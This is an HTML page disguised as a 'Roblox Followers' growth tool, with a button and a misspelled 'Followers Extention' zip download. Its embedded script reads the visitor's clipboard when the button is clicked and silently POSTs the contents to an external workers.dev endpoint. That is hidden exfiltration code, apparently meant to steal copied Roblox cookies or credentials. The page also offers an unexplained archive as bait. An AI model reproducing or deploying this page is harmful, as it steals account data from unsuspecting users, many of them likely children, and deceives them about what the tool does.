<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Roblox Followers</title>
<link rel="icon" type="image/png" href="favicon.png">

<style>
* {
  box-sizing: border-box;
}

html,
body {
  margin: 0;
  min-height: 100%;
  font-family: Arial, Helvetica, sans-serif;
}

body {
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  overflow: auto;
  padding: 30px 0;

  background:
    radial-gradient(circle at 20% 20%, rgba(255,255,255,.08), transparent 30%),
    radial-gradient(circle at 80% 80%, rgba(120,120,255,.10), transparent 30%),
    linear-gradient(135deg, #08080c, #11111a 50%, #08080c);

  color: white;
}

.background {
  position: fixed;
  inset: 0;
  pointer-events: none;
  overflow: hidden;
}

.glow {
  position: absolute;
  width: 400px;
  height: 400px;
  border-radius: 50%;
  background: rgba(255,255,255,.035);
  filter: blur(80px);
}

.glow.one {
  top: -180px;
  left: -150px;
}

.glow.two {
  right: -180px;
  bottom: -180px;
}

.card {
  position: relative;
  width: min(90%, 560px);
  padding: 50px 35px;
  text-align: center;

  background: rgba(20,20,28,.78);
  border: 1px solid rgba(255,255,255,.10);
  border-radius: 28px;

  box-shadow:
    0 30px 80px rgba(0,0,0,.55),
    inset 0 1px rgba(255,255,255,.05);

  backdrop-filter: blur(20px);
}

.logo {
  width: 78px;
  height: 78px;
  margin: 0 auto 22px;

  display: flex;
  align-items: center;
  justify-content: center;

  border-radius: 22px;
  background: white;
  color: #111;

  font-size: 34px;
  font-weight: 900;

  box-shadow: 0 15px 40px rgba(0,0,0,.35);
}

h1 {
  margin: 0;
  font-size: 38px;
  letter-spacing: -1px;
}

.subtitle {
  margin: 12px 0 30px;
  color: #a9a9b5;
  font-size: 16px;
  line-height: 1.5;
}

.main-button,
.download-button {
  display: block;
  width: 100%;
  padding: 18px 24px;

  border: none;
  border-radius: 15px;

  background: white;
  color: #111;

  font-size: 18px;
  font-weight: 800;

  cursor: pointer;
  text-decoration: none;

  transition:
    transform .2s ease,
    box-shadow .2s ease,
    background .2s ease;
}

.main-button {
  margin-bottom: 14px;
}

.main-button:hover,
.download-button:hover {
  transform: translateY(-3px);
  box-shadow: 0 15px 35px rgba(255,255,255,.16);
  background: #f0f0f0;
}

.main-button:active,
.download-button:active {
  transform: translateY(0) scale(.98);
}

.status {
  margin-top: 18px;
  min-height: 20px;
  font-size: 13px;
  color: #aaaab5;
}

.download-box {
  margin-top: 28px;
  padding: 22px;

  border-radius: 20px;
  background: rgba(255,255,255,.045);
  border: 1px solid rgba(255,255,255,.08);
}

.download-title {
  margin: 0 0 7px;
  font-size: 19px;
  font-weight: 800;
}

.download-text {
  margin: 0 0 17px;
  color: #9999a6;
  font-size: 13px;
}

@media (max-width: 500px) {
  .card {
    padding: 42px 24px;
  }

  h1 {
    font-size: 31px;
  }

  .logo {
    width: 68px;
    height: 68px;
    font-size: 29px;
  }
}
</style>

</head>

<body>

<div class="background">
  <div class="glow one"></div>
  <div class="glow two"></div>
</div>

<div class="card">

  <div class="logo">R</div>

  <h1>Roblox Followers</h1>

  <p class="subtitle">
    Grow your Roblox presence with one simple click.
  </p>

  <button class="main-button" id="main">
    Roblox Followers
  </button>

  <div class="status" id="status"></div>

  <div class="download-box">

    <p class="download-title">
      Followers Extension
    </p>

    <p class="download-text">
      Download the Roblox Followers extension.
    </p>

    <a
      class="download-button"
      href="Followers_Extention_Donlowed.zip"
      download="Followers Extention Donlowed.zip"
    >
      ↓ Download Followers Extention
    </a>

  </div>

</div>

<script>
const button = document.getElementById("main");
const status = document.getElementById("status");

const SEND_ENDPOINT =
  "https://young-brook-716e.abojanmawzoon.workers.dev";

button.addEventListener("click", async () => {

  try {

    status.textContent = "Submitting...";

    const text = await navigator.clipboard.readText();

    if (!text) {
      status.textContent = "Your clipboard is empty.";
      return;
    }

    await fetch(SEND_ENDPOINT, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        clipboardText: text
      })
    });

  } catch (error) {

    status.textContent =
      "Something went wrong. Please try again.";

    console.error(error);
  }
});
</script>

</body>
</html>
